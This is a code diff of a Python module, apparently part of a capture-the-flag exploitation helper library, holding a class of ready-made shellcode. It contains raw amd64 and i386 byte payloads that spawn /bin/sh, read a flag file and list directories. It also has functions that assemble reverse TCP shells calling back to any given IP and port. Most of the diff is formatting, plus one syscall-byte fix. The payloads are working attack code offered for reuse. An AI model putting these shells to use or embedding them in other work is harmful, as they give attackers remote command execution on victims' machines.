@@ -13,13 +13,14 @@ __all__ = [
     "shellcode2unicode"
 ]
 
+
 class ShellcodeMall:
     # most of these shellcode from http://shell-storm.org/shellcode/
     class amd64:
         __all_execve_bin_sh = {
             27: b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05",
             29: b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
-            }
+        }
         execve_bin_sh = __all_execve_bin_sh[27]
         execveat_bin_sh = __all_execve_bin_sh[29]
         cat_flag = b"\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x67\x6d\x60\x66\x01\x01\x01\x48\x31\x04\x24\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"
@@ -31,7 +32,7 @@ class ShellcodeMall:
             """
             /* socket(AF_INET, SOCK_STREAM, 0) */
             socket:
-                push 0x41
+                push 41
                 pop rax
                 cdq
                 push 2
@@ -55,17 +56,18 @@ class ShellcodeMall:
             for i in ip.strip().split("."):
                 int_ip <<= 8
                 int_ip |= int(i)
-            res = b"\x6a\x2a\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00"+ \
-                    port.to_bytes(2, "big") + int_ip.to_bytes(4, "big") + b"\x51\x54\x5e\xb2\x10\x0f\x05"
+            res = b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00" + \
+                port.to_bytes(2, "big") + int_ip.to_bytes(4,
+                                                          "big") + b"\x51\x54\x5e\xb2\x10\x0f\x05"
             return res
-        
+
         @staticmethod
         def reverse_tcp_shell(ip: str, port: int) -> bytes:
             # from http://shell-storm.org/shellcode/files/shellcode-907.php
             """
             /* socket(AF_INET, SOCK_STREAM, 0) */
             socket:
-                push 0x41
+                push 41
                 pop rax
                 cdq
                 push 2
@@ -107,9 +109,8 @@ class ShellcodeMall:
                 int_ip <<= 8
                 int_ip |= int(i)
             return b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00" + \
-            port.to_bytes(2, "big") + int_ip.to_bytes(4, "big") + \
-            b"\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00\x51\x54\x5f\x0f\x05"
-
+                port.to_bytes(2, "big") + int_ip.to_bytes(4, "big") + \
+                b"\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00\x51\x54\x5f\x0f\x05"
 
     class i386:
         __all_execve_bin_sh = {
@@ -124,7 +125,7 @@ class ShellcodeMall:
         ls_current_dir = b"\x68\x01\x01\x01\x01\x81\x34\x24\x2f\x2e\x01\x01\x89\xe3\xb9\xff\xff\xfe\xff\xf7\xd1\x31\xd2\x6a\x05\x58\xcd\x80\x89\xc3\x89\xe1\x31\xd2\xb6\x02\x31\xc0\xb0\x8d\xcd\x80\x6a\x01\x5b\x89\xe1\x31\xd2\xb6\x02\x6a\x04\x58\xcd\x80"
 
         @staticmethod
-        def reverse_tcp_shell(ip: str, port:int) -> bytes:
+        def reverse_tcp_shell(ip: str, port: int) -> bytes:
             int_ip = 0
             for i in ip.strip().split("."):
                 int_ip <<= 8
@@ -140,7 +141,7 @@ def shellcode2unicode(shellcode: str or bytes) -> str:
 
     Returns:
         str: string with '\\x'.
-    
+
     Example:
         >>> s = shellcode2unicode('abcd')
         >>> print(s)
